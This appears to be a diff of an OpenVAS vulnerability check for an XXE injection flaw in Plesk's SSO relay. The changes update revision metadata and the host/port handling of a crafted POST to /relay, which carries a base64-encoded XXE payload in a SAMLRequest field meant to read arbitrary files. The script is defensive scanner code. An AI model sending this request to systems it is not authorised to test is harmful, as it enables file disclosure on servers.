@@ -1,6 +1,6 @@
 ##############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_plesk_xxe_06_13.nasl 3911 2016-08-30 13:08:37Z mime $
+# $Id: gb_plesk_xxe_06_13.nasl 6756 2017-07-18 13:31:14Z cfischer $
 #
 # Plesk XXE Injection Vulnerability
 #
@@ -30,7 +30,7 @@ CPE = "cpe:/a:parallels:parallels_plesk_panel";
 if (description)
 {
  script_oid("1.3.6.1.4.1.25623.1.0.105046");
- script_version ("$Revision: 3911 $");
+ script_version ("$Revision: 6756 $");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
 
@@ -38,15 +38,13 @@ if (description)
 
  script_xref(name:"URL", value:"http://makthepla.net/blog/=/plesk-sso-xxe-xss");
  
- script_tag(name:"last_modification", value:"$Date: 2016-08-30 15:08:37 +0200 (Tue, 30 Aug 2016) $");
+ script_tag(name:"last_modification", value:"$Date: 2017-07-18 15:31:14 +0200 (Tue, 18 Jul 2017) $");
  script_tag(name:"creation_date", value:"2014-06-13 14:56:42 +0200 (Fri, 13 Jun 2014)");
- script_summary("Determine if plesk is prone to an xxe attack");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("gb_plesk_detect.nasl");
  script_require_ports("Services/www", 8443);
- script_exclude_keys("Settings/disable_cgi_scanning");
  script_mandatory_keys("plesk/installed");
 
  script_tag(name : "impact" , value : "An attacker can exploit this vulnerability to retrieve arbitrary files
@@ -76,13 +74,11 @@ xxe = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE doc [ <!
 
 xxe = urlencode( str:base64( str:xxe ) );
 
-host = get_host_name();
-if( port != 80 && port != 443 )
-  host += ':' + port;
+host = http_host_name(port:port);
 
 rs = urlencode( str:base64( str:get_host_ip() ) );
 
-ex = 'SAMLRequest=' + xxe  + '&response_url=http://OpenVAS&RelayState=' + rs  + '&RefererScheme=https&RefererHost=https://' + host + ':' + port + '&RefererPort=' + port;
+ex = 'SAMLRequest=' + xxe  + '&response_url=http://OpenVAS&RelayState=' + rs  + '&RefererScheme=https&RefererHost=https://' + host + '&RefererPort=' + port;
 
 len = strlen( ex );
 
@@ -90,7 +86,7 @@ req = 'POST /relay HTTP/1.1\r\n' +
       'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' + 
       'Host: ' + host + '\r\n' + 
       'Accept: */*\r\n' + 
-      'Referer: https://' + host + ':' + port + '/relay\r\n' +
+      'Referer: https://' + host + '/relay\r\n' +
       'Content-Length: ' + len + '\r\n' +
       'Content-Type: application/x-www-form-urlencoded\r\n' + 
       '\r\n' +
